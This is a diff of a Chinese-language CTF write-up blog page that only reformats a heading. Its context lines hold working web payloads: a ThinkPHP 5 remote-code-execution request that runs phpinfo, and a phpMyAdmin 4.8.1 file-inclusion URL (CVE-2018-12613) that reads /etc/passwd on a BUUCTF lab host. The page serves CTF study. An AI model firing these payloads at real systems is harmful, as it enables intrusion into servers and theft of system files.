@@ -17,7 +17,8 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=phpinfo&amp;server[REQUEST_METHOD]=-1&amp;method=get</span><br></pre></td></tr></table></figure>
 
 <p>通过读取phpinfo，获取到flag！！<br>关于thinkphp5的漏洞github上有人已经收集并集中在一起了，</p>
-<h1 id="附上链接：关于ThinkPHP框架的历史漏洞分析集合"><a href="#附上链接：关于ThinkPHP框架的历史漏洞分析集合" class="headerlink" title="附上链接：关于ThinkPHP框架的历史漏洞分析集合"></a>附上链接：<a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">关于ThinkPHP框架的历史漏洞分析集合</a></h1><p>[PHPMYADMIN]CVE-2018-12613<br>phpmyadmin 4.8.1 远程文件包含漏洞 (CVE-2018-12613)</p>
+<p> 附上链接：<a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">关于ThinkPHP框架的历史漏洞分析集合</a></p>
+<p>#[PHPMYADMIN]CVE-2018-12613<br>phpmyadmin 4.8.1 远程文件包含漏洞 (CVE-2018-12613)</p>
 <p>buuctf的warmup就是这个洞</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">http://node3.buuoj.cn:29957/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
